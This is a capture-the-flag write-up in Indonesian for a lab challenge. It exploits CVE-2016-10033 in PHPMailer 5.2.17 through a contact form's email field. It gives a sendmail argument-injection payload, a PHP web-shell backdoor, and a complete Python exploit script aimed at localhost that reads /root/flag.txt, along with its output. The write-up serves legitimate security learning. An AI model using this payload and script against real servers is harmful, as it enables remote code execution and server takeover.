# WriteUp: Kritik dan saran

## Overview

* **Judul:** Kritik dan saran
* **Kategori:** Input Injection / CVE
* **Poin:** 50
* **Deskripsi:** Ambil alih server.
* **URL:** `http://localhost:1337`

## Reconnaissance & Source Code Analysis

Analisis dimulai dengan memeriksa dependensi aplikasi melalui file `composer.lock` yang ditemukan di dalam server.

**Pemeriksaan Versi Library:**

```bash
$ docker exec kritikdansaran-web-1 cat composer.lock
...
"name": "phpmailer/phpmailer",
"version": "v5.2.17",
...

```

Aplikasi teridentifikasi menggunakan **PHPMailer versi 5.2.17**.

**Analisis Kode (`contact.php`):**

```php
$email = $_POST['email']; // Input user
$mail->setFrom($email, $name); // Vulnerable function call

```

Kode di atas menunjukkan bahwa input `$email` dari pengguna langsung diteruskan ke fungsi `setFrom` tanpa validasi atau sanitasi yang memadai.

## Vulnerability Analysis

Versi PHPMailer yang digunakan (5.2.17) memiliki kerentanan keamanan kritis yang dikenal sebagai **CVE-2016-10033**.

**Detail CVE-2016-10033 (Remote Code Execution):**
Kerentanan ini terjadi karena PHPMailer gagal memvalidasi alamat pengirim dengan benar sebelum melewatinya ke fungsi `mail()` PHP (yang membungkus binary `sendmail`). Hal ini memungkinkan penyerang untuk menyuntikkan parameter/argumen tambahan ke perintah `sendmail`.

**Mekanisme Serangan:**
Penyerang dapat menyuntikkan argumen `-X` (logfile). Argumen ini memaksa `sendmail` untuk mencatat log transaksi email ke file tertentu. Dengan memanipulasi path log ke webroot (misalnya `/var/www/html/shell.php`) dan menyisipkan kode PHP di dalam header atau body email, penyerang dapat membuat **Web Shell**.

**Payload Concept:**

```text
"attacker\" -oQ/tmp/ -X/var/www/html/shell.php "@email.com

```

## Exploitation

Eksploitasi dilakukan menggunakan script Python yang mengirimkan request POST berbahaya untuk membuat backdoor, lalu menggunakannya untuk membaca flag yang berlokasi di `/root/flag.txt`.

**Script Solver (`exploit.py`):**

```python
import requests

TARGET_URL = "http://localhost:1337/contact.php"
SHELL_URL = "http://localhost:1337/shell.php"

# Payload CVE-2016-10033
# -X: Menulis log transaksi ke shell.php
EMAIL_PAYLOAD = '"pwned\\" -oQ/tmp/ -X/var/www/html/shell.php "@pwn.com'

# PHP Backdoor (disisipkan dalam body email)
PHP_CODE = "<?php system($_GET['cmd']); exit; ?>"

def exploit():
    print("[*] Target: " + TARGET_URL)
    print("[*] Sending Payload to create backdoor...")
    
    data = {
        'name': 'Hacker',
        'email': EMAIL_PAYLOAD,
        'subject': 'Pwned',
        'message': PHP_CODE
    }
    
    try:
        # 1. Trigger CVE untuk membuat file shell.php
        requests.post(TARGET_URL, data=data)
        
        # 2. Akses backdoor dan baca flag
        print("[*] Backdoor created at: " + SHELL_URL)
        print("[*] Executing 'cat /root/flag.txt'...")
        
        r = requests.get(SHELL_URL, params={'cmd': 'cat /root/flag.txt'})
        
        if "pwn{" in r.text:
            print("\n[+] RCE SUCCESS! Flag Found:")
            print("-" * 40)
            # Filter output untuk mengambil baris flag saja
            clean_output = [line for line in r.text.split('\n') if "pwn{" in line]
            print(clean_output[0] if clean_output else r.text)
            print("-" * 40)
        else:
            print("[-] Exploit failed.")
            
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()

```

## Execution Output

```bash
$ ./exploit.py
[*] Target: http://localhost:1337/contact.php
[*] Sending Payload to create backdoor...
[*] Backdoor created at: http://localhost:1337/shell.php
[*] Executing 'cat /root/flag.txt'...

[+] RCE SUCCESS! Flag Found:
----------------------------------------
pwn{adf834351c564a6b72c13087ee21c398}
----------------------------------------

```

## Flag

```
pwn{adf834351c564a6b72c13087ee21c398}

```
